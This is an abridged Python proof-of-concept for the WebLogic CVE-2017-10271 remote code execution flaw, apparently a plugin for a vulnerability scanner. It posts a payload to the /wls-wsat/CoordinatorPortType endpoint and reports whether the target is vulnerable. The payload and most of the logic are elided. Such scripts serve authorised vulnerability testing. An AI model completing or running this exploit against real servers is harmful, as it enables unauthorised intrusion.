...
class DemoPOC:
    ...
    Script = "Weblogic_CVE_2017_10271_RCE-test.py"         #POC文件名（包含后缀）
    ...
    def _exploit(self):
        ...
        self.url = 'http://{}:{}/wls-wsat/CoordinatorPortType'.format(self.ip, self.port)
        payload = '''
        ...
        result = {}
        try:
            res = requests.post(self.url, data=payload, headers=HEADERS, verify=False, timeout=5)
    ...
    def _verify(self):
        ...
        try:
            ...
            if isinstance(res, dict) and 'Error' in res:
                ...
                result['VerifyInfo'] = f"[!] Vulnerability found at {self.ip}"  # 确认漏洞存在，必须返回[!]的信息
            else:
                result['VerifyInfo'] = "[SAFE] No vulnerability found." #确认漏洞不存在，必须返回[SAFE]信息
...
if __name__ == '__main__':
    ...
    poc.check_and_install_dependencies()  # 检查并安装所需依赖
    result = poc._verify()
